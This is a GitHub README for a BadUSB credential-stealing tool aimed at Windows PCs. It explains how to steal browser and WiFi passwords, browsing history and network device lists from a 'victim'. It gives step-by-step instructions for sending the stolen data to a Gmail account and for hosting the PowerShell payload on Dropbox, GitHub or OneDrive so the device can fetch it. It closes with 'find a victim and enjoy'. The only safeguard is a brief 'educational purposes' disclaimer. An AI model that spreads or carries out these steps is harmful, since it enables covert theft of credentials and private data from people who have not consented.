# BadUSB_passStealer
https://github.com/tuconnaisyouknow/BadUSB_passStealer
# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ℹ️
This **script** allows you to steal the following **information** :
* Browser **passwords** (Chrome, Firefox, Opera);
* **WiFi** passwords;
* Browser **history** from the last 7 days;
* The list of all **devices** that are **connected to victim's network**;
### NB n°1 (for arduino BadUSB)
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French).
### US Layout
For US layout you only have to replace by this for "\\" :
```
Keyboard.press(92);
Keyboard.releaseAll();
```
And by this for "@" :
```
Keyboard.press(64);
Keyboard.releaseAll();
```
### NB n°2
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
### NB n°3
When you plug the BadUSB in a PC you  have to wait for the caps lock to flash to unplug it.
# Getting Started ✔️
## Requirments
1. Have a **BadUSB**.

2. Install **Arduino software** [here](https://www.arduino.cc/en/software) (if you use a BadUSB which is based on arduino);

3. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps);

4. Have a victim with **Windows OS** installed in his PC;
## Install
1. Download this repository;

**Linux :**
```
git clone https://github.com/tuconnaisyouknow/BadUSB_passStealer
cd BadUSB_passStealer
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/ciaoV2.ps1) at line 16, 18, 19;

3. Replace link in [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) at line 85 or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) at line 28;

4. Put the .ino or .txt file in your **BadUSB**;

5. Find a victim and enjoy !
## Requirments for victim PC
* Turn off caps lock.
* Switch the keyboard layout to French (or adapt the code according to your layout).
# How to set a link for wget the script ⬇️
## Dropbox
1. Create a dropbox account [here](https://www.dropbox.com);

2. Upload your file;

3. Copy the link of the file and change ?dl=0 by ?dl=1;

4. You will get a link like this : https://dropbox.com/s/link/YOURFILE?dl=1;

5. Now put this link in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
## Github
1. Create a Github account [here](https://github.com/signup);

2. Create a public repository;

3. Upload your file;

4. Go to your file page and click on RAW button;

5. Copy the RAW page link and put it in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt) file;
## One Drive
1. Create a One Drive account [here](https://signup.live.com/signup);

2. Upload your file file;

3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)

4. Put the link you got in the [.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) or [.txt](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.txt)
# Nirsoft tools 🧰
You can download nirsoft tools below if you want :
* [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User : download ; Password : nirsoft123!;
* [WNetWatcher.exe](https://www.nirsoft.net/utils/wireless_network_watcher.html);
* [BrowsingHistoryView.exe](https://www.nirsoft.net/utils/browsing_history_view.html);
* [WirelessKeyView.exe](https://www.nirsoft.net/utils/wireless_key.html);
